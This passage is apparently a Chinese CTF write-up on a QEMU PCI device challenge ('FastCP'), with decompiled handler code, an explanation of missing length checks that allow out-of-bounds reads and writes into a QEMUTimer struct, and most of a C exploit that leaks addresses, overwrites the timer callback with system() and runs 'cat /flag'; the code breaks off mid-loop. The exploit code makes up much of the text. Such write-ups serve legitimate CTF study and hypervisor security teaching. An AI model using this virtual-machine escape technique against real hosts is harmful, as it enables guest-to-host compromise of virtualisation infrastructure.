<span class="keyword">uint64_t</span> CP_list_cnt; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v4; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">bool</span> v7; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v8; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  FastCP_CP_INFO cp_info; <span class="comment">// [rsp+0h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+38h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;cp_info, <span class="number">0</span>, <span class="keyword">sizeof</span>(cp_info));</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);<span class="comment">// read</span></span><br><span class="line">        <span class="keyword">if</span> ( cp_info.CP_cnt &lt;= <span class="number">0x1000</span> )</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">        cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);<span class="comment">// write</span></span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            msi_notify(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">      CP_list_cnt = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( CP_list_cnt &gt; <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="number">3</span> * v8++;</span><br><span class="line">          cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="number">8</span> * v9, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( opaque-&gt;cp_state.CP_list_cnt &gt; v8 );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !CP_list_cnt )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">          v6 = cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">          opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">0LL</span>;</span><br><span class="line">        v4 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          cpu_physical_memory_rw(v3 + opaque-&gt;cp_state.CP_list_src, buf, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v12 &gt; <span class="number">0x1000</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">          ++v4;</span><br><span class="line">          v3 += <span class="number">24LL</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v4 &gt;= v5 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !v5 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  opaque-&gt;cp_state.cmd = <span class="number">0LL</span>;</span><br><span class="line">LABEL_16:</span><br><span class="line">  opaque-&gt;handling = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在timer中存在三个由cmd属性控制的分支，这里直接说三个分支的功能：</p><ol><li>  <code>opaque-&gt;cp_state.cmd = 2</code>; 从<code>opaque-&gt;cp_state.CP_list_src</code>读取内容到栈上，通过<code>( cp_info.CP_cnt &lt;= 0x1000 )</code>验证之后再将<code>cp_info.CP_src</code>内容读取到<code>opaque-&gt;CP_buffer</code>上。</li><li>  <code>opaque-&gt;cp_state.cmd = 4</code>; 从<code>opaque-&gt;cp_state.CP_list_src</code>读取内容到栈上，未通过任何验证，直接将<code>opaque-&gt;CP_buffer</code>写到<code>cp_info.CP_dst</code>上</li><li>  <code>opaque-&gt;cp_state.cmd = 1</code>; 从<code>opaque-&gt;cp_state.CP_list_src + 8 * v9</code>读取内容到栈上，未通过任何验证，将<code>cp_info.CP_src</code>读取到<code>opaque-&gt;CP_buffer</code>上，再将<code>opaque-&gt;CP_buffer</code>写到<code>cp_info.CP_dst</code>上。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> FastCPState struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1A30</span>, align=<span class="number">0x10</span>, copyof_4530)</span><br><span class="line"><span class="number">00000000</span> pdev PCIDevice_0 ?</span><br><span class="line"><span class="number">000008F</span>0 mmio MemoryRegion_0 ?</span><br><span class="line"><span class="number">000009E0</span> cp_state CP_state ?</span><br><span class="line"><span class="number">000009F</span>8 handling db ?</span><br><span class="line"><span class="number">000009F</span>9 db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>A db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>B db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>C irq_status dd ?</span><br><span class="line"><span class="number">00000</span>A00 CP_buffer db <span class="number">4096</span> dup(?)</span><br><span class="line"><span class="number">00001</span>A00 cp_timer QEMUTimer_0 ?</span><br><span class="line"><span class="number">00001</span>A30 FastCPState ends</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="number">00000000</span> QEMUTimer_0 struc ; (<span class="keyword">sizeof</span>=<span class="number">0x30</span>, align=<span class="number">0x8</span>, copyof_1181)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: FastCPState/r</span><br><span class="line"><span class="number">00000000</span> expire_time dq ?</span><br><span class="line"><span class="number">00000008</span> timer_list dq ?                         ; offset</span><br><span class="line"><span class="number">00000010</span> cb dq ?                                 ; offset</span><br><span class="line"><span class="number">00000018</span> opaque dq ?                             ; offset</span><br><span class="line"><span class="number">00000020</span> next dq ?                               ; offset</span><br><span class="line"><span class="number">00000028</span> attributes dd ?</span><br><span class="line"><span class="number">0000002</span>C scale dd ?</span><br><span class="line"><span class="number">00000030</span> QEMUTimer_0 ends</span><br></pre></td></tr></table></figure><p>结合上述结构体再加上上面的分析结果漏洞已经呼之欲出了。因为情况2和3中没有对len进行验证导致可以越界使用结构体产生的漏洞。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>因为漏洞点较为简单，所以利用方式也比较简单</p><ol><li>  首先通过情况2越界读取到<code>cp_timer</code>成员中的内容。该成员中cb的值为<code>fastcp_cp_timer</code>函数的地址(在<code>pci_FastCP_realize</code>中完成赋值)，进而泄漏出system的地址。顺便泄漏出opaque成员地址。</li><li>  通过情况3越界写入内容到<code>cp_timer</code>成员，劫持cb和opaque。</li><li>  最后触发timer完成利用</li></ol><h4 id="注意！！"><a href="#注意！！" class="headerlink" title="注意！！"></a><strong>注意！！</strong></h4><p><strong>虽然利用方式特别简单，但是这道题目有一点是非常容易被忽略的。那就是物理地址连续不代表虚拟地址连续！</strong></p><p>在下面exp中，在第一次读取到<code>cp_timer</code>成员到内容后并没有使用<code>*(unsigned long long *)(userbuf + 0x1010)</code>来读取，因为程序中实际写入到函数是<code>cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, 1);</code>而这里写入到的是物理地址，但是物理地址并不连续，所以这里是读取不到的。所以最后往<code>cp_timer</code>成员写入的时候使用的也是<code>va2pa(userbuf + 0x1000) - 0x1000</code>写入。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> CP_src;</span><br><span class="line">    <span class="keyword">uint64_t</span> CP_cnt;</span><br><span class="line">    <span class="keyword">uint64_t</span> CP_dst;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> expire_time;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> timer_list;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cb;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> next;</span><br><span class="line">    <span class="keyword">int</span> attributes;</span><br><span class="line">    <span class="keyword">int</span> scale;</span><br><span class="line">    <span class="keyword">char</span> command[<span class="number">0x50</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_CP_list_cnt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x10</span>)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_CP_list_src</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + <span class="number">8</span>)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_cmd</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> src, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write_CP_list_cnt(cnt);</span><br><span class="line">    write_CP_list_src(src);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(mmio_mem + +<span class="number">0x18</span>)) = cmd;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/bus/pci/devices/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x2000</span>);</span><br><span class="line">    phy_userbuf = va2pa(userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff virtual address: %p\n&quot;</span>, userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff physical address: %p\n&quot;</span>, (<span class="keyword">void</span> *)phy_userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span> <span class="title">info</span>;</span></span><br><span class="line">    info.CP_src = <span class="literal">NULL</span>;</span><br><span class="line">    info.CP_dst = phy_userbuf;</span><br><span class="line">    info.CP_cnt = <span class="number">0x1000</span> + <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">4</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    info.CP_src = phy_userbuf + <span class="number">0x1000</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x30</span>;</span><br><span class="line">    info.CP_dst = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">2</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    info.CP_src = <span class="literal">NULL</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x30</span>;</span><br><span class="line">    info.CP_dst = phy_userbuf;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, &amp;info, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    run_cmd(<span class="number">4</span>, phy_userbuf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fastcp_cp_timer=&gt;%p\n&quot;</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x10</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, va2pa(userbuf + <span class="number">0x1000</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, va2pa(userbuf + <span class="number">0x2000</span>));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fastcp_cp_timer = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> elf_base = fastcp_cp_timer - <span class="number">0x4DCE80</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> system_addr = elf_base + <span class="number">0x2C2180</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> opaque_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> <span class="title">timer</span>;</span></span><br><span class="line"></span><br><span class="line">    timer.expire_time = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    timer.timer_list = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x8</span>);</span><br><span class="line">    timer.cb = system_addr;</span><br><span class="line">    timer.opaque = opaque_addr + <span class="number">0x1a30</span>;</span><br><span class="line">    timer.next = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)(userbuf + <span class="number">0x20</span>);</span><br><span class="line">    timer.attributes = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(userbuf + <span class="number">0x28</span>);</span><br><span class="line">    timer.scale = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(userbuf + <span class="number">0x2c</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;timer.command, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf + <span class="number">0x1000</span>, &amp;timer, <span class="keyword">sizeof</span>(timer));</span><br><span class="line"></span><br><span class="line">    info.CP_src = va2pa(userbuf + <span class="number">0x1000</span>) - <span class="number">0x1000</span>;</span><br><span class="line">    info.CP_cnt = <span class="number">0x1000</span> + <span class="number">0x30</span> + <span class="number">9</span>;</span><br><span class="line">    info.CP_dst = va2pa(userbuf + <span class="number">0x1000</span>) - <span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x11</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span 